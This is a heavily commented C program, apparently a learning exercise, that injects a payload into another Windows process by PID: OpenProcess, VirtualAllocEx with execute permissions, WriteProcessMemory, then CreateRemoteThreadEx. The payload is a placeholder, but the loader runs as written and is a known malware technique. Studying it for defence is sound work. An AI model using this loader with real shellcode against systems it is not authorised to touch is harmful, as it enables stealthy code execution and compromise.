#include<Windows.h>
#include<stdio.h>


const char *k = "[+]";
const char *e = "[-]";
const char *i = "[*]";


DWORD PID,TID =NULL; //Unsign interger 32-bit
HANDLE hProcess, hThread = NULL; 
LPVOID rBuffer = NULL; //void far(Data Type): beyound 64kb storage (Default) far indicated that the pointer should to use the segment or offset to access the memory.

unsigned char payloads[] = "\x41\x41\x41";

int main(int argc, char *argv[]){
    //argc -> argument count (Command Line)
    //argv -> argument vector, receive user input parameter form (Command Line)

    //*Check User's parameter*
    if(argc < 2){  
        //argv[0] -> programe name 
        //argv[1] -> PID 
        printf("%s Usage: program.exe <PID>",e);  
        return EXIT_FAILURE;

    }

    //*Recive user input asign to PID variable*
    PID = atoi(argv[1]); // input:string , "ASCII to Integer" String to interger 
    printf("%s Open a handle to process (%ld)\n",i,PID); //ld (long int-decimal)


    //*Process Hanlder, open the handle to process* 

    // HANDLE OpenProcess
    //   [in] DWORD dwDesiredAccess, //Procss Access Rights  
    //   [in] BOOL  bInheritHandle, // inheritHandle From the parant process 
    //   [in] DWORD dwProcessId
    // );
    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, 
        FALSE,
        PID
    );

    //*Check Open handle Error* 
    if (hProcess==NULL){
        printf("%s Can't not to opent the handler to the process (%ld) error: %ld", e, PID, GetLastError());
        // Retrived and calling the threads last Error code value -> System Error Code 
        return EXIT_FAILURE; 
    }else {
        printf("%s Got the handle to process\n\\---0x%p\n ",k,hProcess);
    }

    //*To Allocate the Virtuall memory to the process*

    // LPVOID VirtualAllocEx(
    //   [in]           HANDLE hProcess,  //Specify Process 
    //   [in, optional] LPVOID lpAddress,
    //   [in]           SIZE_T dwSize,
    //   [in]           DWORD  flAllocationType,
    //   [in]           DWORD  flProtect
    // );
    //return: base address of the allocated region of pages.

    rBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(payloads),
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_EXECUTE_READWRITE
    );
    printf("%s Allocate %zu-Byptes with PAGE_EXECUTE_READWRITE Permission within process\n", k, sizeof(payloads));



    //*Write dat to area of memory*

    // BOOL WriteProcessMemory(
    //   [in]  HANDLE  hProcess,        //A handle to the process memory to be modified.
    //   [in]  LPVOID  lpBaseAddress,   //A pointer to the base address in the specified process to which data is written. 
    //   [in]  LPCVOID lpBuffer,        //A pointer to the buffer that contains data to be written in the address space of the specified process.
    //   [in]  SIZE_T  nSize,           //The number of bytes to be written to the specified process.
    //   [out] SIZE_T  *lpNumberOfBytesWritten //A pointer to a variable that receives the number of bytes transferred into the specified process. This parameter is optional. If lpNumberOfBytesWritten is NULL, the parameter is ignored.
    // );
    // return: If the function succeeds, the return value is nonzero.
    // If the function fails, the return value is 0 (zero)

    int isInjectSucess = WriteProcessMemory(
        hProcess,
        rBuffer,
        payloads,
        sizeof(payloads),
        NULL
    );
    printf("%s Wrote %zu-Bytes to process memory\n",k,sizeof(payloads));
    if (isInjectSucess != 0){
        printf("%s Write sometheing in virtual memory Sucessfully!!\n",k);
    }else{
        printf("%s Fail to write paylaod to memory, error:%ld\n", e, GetLastError());
    }
    //*Create a thread taht run the payload in virtual address space 

    // HANDLE CreateRemoteThread(
    //   [in]  HANDLE                 hProcess,
    //   [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,  //(security setting)A pointer to a SECURITY_ATTRIBUTES structure , . If lpThreadAttributes is NULL, the thread gets a default security descriptor and the handle cannot be inherited.
    //   [in]  SIZE_T                 dwStackSize,  //The initial size of the stack, in bytes, . If this parameter is 0 (zero), the new thread uses the default size for the executable.
    //   [in]  LPTHREAD_START_ROUTINE lpStartAddress,  //A pointer to the application-defined function of type LPTHREAD_START_ROUTINE,represents the starting address of the thread in the remote process 
    //   [in]  LPVOID                 lpParameter,  //A pointer to a variable to be passed to the thread function.
    //   [in]  DWORD                  dwCreationFlags,  //The flags that control the creation of the thread. 0 The thread runs immediately after creation. 
    //   [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,  //An attribute list that contains additional parameters for the new thread
    //   [out] LPDWORD                lpThreadId  //A pointer to a variable that receives the thread identifier.
    // );
    // returnIf the function succeeds, the return value is a handle to the new thread.
    // If the function fails, the return value is NULL

    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rBuffer,
        NULL,
        0,
        0,
        &TID
    );

    if(hThread == NULL){
        printf("%s Fail to create and handle the Reomte Threads, Error:%ld", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    
    printf("%s Got the handle to the thread TID=(%ld) \n\\---0x%p\n ",k,TID,hThread);

    printf("%s Clean Up",i);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s Clean Finished ! ",k);
    return EXIT_SUCCESS;
}
